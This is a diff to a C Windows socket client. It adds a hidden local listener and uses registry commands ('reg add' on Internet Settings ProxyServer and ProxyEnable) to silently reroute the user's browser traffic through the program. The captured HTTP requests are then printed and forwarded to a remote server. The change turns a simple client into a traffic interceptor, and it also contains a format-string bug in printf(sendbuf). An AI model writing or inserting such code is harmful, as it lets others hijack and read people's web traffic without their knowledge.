@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <stdbool.h>
 #define DEFAULT_PORT "27015"
+#define LISTEN_PORT "5102"
 #define DEFAULT_BUFLEN 512
 
 #pragma comment (lib, "Ws2_32.lib")
@@ -34,6 +35,7 @@ int main() {
 
     struct addrinfo *result = NULL,
             *ptr = NULL,
+            *listen_addr = NULL,
             hints;
 
     // reset the memory of hints and set values for each of the following parameters: internet protocol v4, tcp
@@ -50,14 +52,31 @@ int main() {
         return 1;
     }
 
+    iResult = getaddrinfo("127.0.0.1", LISTEN_PORT, &hints, &listen_addr);
+    if (iResult != 0) {
+        printf("getaddrinfo failed: %d\n", iResult);
+        WSACleanup();
+        return 1;
+    }
+
     SOCKET ConnectSocket = INVALID_SOCKET;
+    SOCKET ListenSocket = INVALID_SOCKET;
 // Attempt to connect to the first address returned by
 // the call to getaddrinfo
     ptr=result;
 
 // Create a SOCKET for connecting to server
-    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
-                           ptr->ai_protocol);
+    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,ptr->ai_protocol);
+    ListenSocket = socket(listen_addr->ai_family, listen_addr->ai_socktype, listen_addr->ai_protocol);
+    iResult = bind(ListenSocket, listen_addr->ai_addr, (int)listen_addr->ai_addrlen);
+
+    if (iResult == SOCKET_ERROR) {
+        printf("bind failed with error: %d\n", WSAGetLastError());
+        freeaddrinfo(result);
+        closesocket(ListenSocket);
+        WSACleanup();
+        return 1;
+    }
     if (ConnectSocket == INVALID_SOCKET) {
         printf("Error at socket(): %ld\n", WSAGetLastError());
         freeaddrinfo(result);
@@ -81,8 +100,33 @@ int main() {
     }
     int recvbuflen = DEFAULT_BUFLEN;
     // maximum buffer for messages length
-    char sendbuf[DEFAULT_BUFLEN];
+    char sendbuf[2048];
     char recvbuf[DEFAULT_BUFLEN];
+
+
+    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"ProxyServer\" /t REG_SZ /d \"127.0.0.1:5102\" /f");
+    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"ProxyEnable\" /t REG_DWORD /d \"1\" /f");
+    printf("Listening... ");
+    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
+        printf("Listen failed with error: %d\n", WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    SOCKET ClientSocket = INVALID_SOCKET;
+
+    conn:
+    ClientSocket = INVALID_SOCKET;
+
+    ClientSocket = accept(ListenSocket, NULL, NULL);
+    if (ClientSocket == INVALID_SOCKET) {
+        closesocket(ListenSocket);
+        WSACleanup();
+        return 1;
+    } else {
+        printf("Connected. \n");
+    }
 
     while (true) {
         iResult = 0;
@@ -94,8 +138,14 @@ int main() {
         memset(sendbuf, 0, sizeof(sendbuf));
         memset(recvbuf, 0, sizeof(recvbuf));
 
+        // Intercept http requests
+        recv(ClientSocket, sendbuf, 2048,0);
+
         // Get user input
-        gets(sendbuf);
+//        gets(sendbuf);
+
+        printf(sendbuf);
+
         int contentLength = strlen(sendbuf);
         char * message = sendbuf;
         sent = false;
@@ -150,6 +200,7 @@ int main() {
                 recv(ConnectSocket, msg, contentLength, 0);
                 strcat(fullmsg, msg);
                 printf(fullmsg);
+                goto conn;
                 received = true;
             } else {
                 contentLength -= DEFAULT_BUFLEN;
